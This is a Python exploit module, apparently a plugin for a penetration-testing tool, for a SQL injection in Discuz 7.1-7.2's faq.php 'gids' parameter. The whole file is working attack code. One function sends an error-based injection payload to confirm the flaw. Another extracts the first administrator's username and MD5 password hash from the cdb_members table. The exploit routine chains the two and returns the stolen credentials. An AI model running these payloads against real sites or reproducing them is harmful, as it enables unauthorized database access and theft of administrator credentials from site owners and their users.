#!/usr/bin/env python
# -*- coding:utf-8 -*-

from lib import logger
from lib import requests

author = "Chu <root@sh3ll.me>"
scope = "Discuz 7.1-7.2"
description = "/faq.php 参数 gids 未初始化 导致 SQL 注入"
reference = "http://www.wooyun.org/bugs/wooyun-2014-066095"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]


def verify(url):
    """
    判断是否存在注入
    :param url: 网站地址
    :return: bool
    """
    logger.process("Requesting target site")
    r = requests.post(url,
                      data={
                          "gids[99]": "'",
                          "gids[100][0]": ") and (select 1 from (select count(*"
                                          "),concat(version(),floor(rand(0)*2))"
                                          "x from information_schema.tables gro"
                                          "up by x)a)#"
                      },
                      timeout=5)
    r.close()
    if "MySQL Query Error" in r.text:
        logger.success("Exploitable!")
        return True


def get_hash(url):
    """
    获取管理 hash
    :param url: 网站地址
    :return: dict, 用户名及 md5
    """
    logger.process("Getting manager's hash")
    r = requests.post(url,
                      data={
                          "gids[99]": "'",
                          "gids[100][0]": ") and (select 1 from (select count(*"
                                          "),concat((select (select (select con"
                                          "cat(0x7e7e7e,username,0x7e,password,"
                                          "0x7e7e7e) from cdb_members limit 0,1"
                                          ") ) from `information_schema`.tables"
                                          " limit 0,1),floor(rand(0)*2))x from "
                                          "information_schema.tables group by x"
                                          ")a)#"
                      },
                      timeout=5)
    r.close()
    result = r.text.split("~~~")[1].split("~")
    return {"username": result[0], "md5": result[1]}


def exploit(URL):
    url = URL + "/faq.php?action=grouppermission"
    if verify(url):
        manager_hash = get_hash(url)
        logger.success("Username: %s" % manager_hash["username"])
        logger.success("Hash: %s" % manager_hash["md5"])
        return "%s: %s|%s" % (URL, manager_hash["username"], manager_hash["md5"])
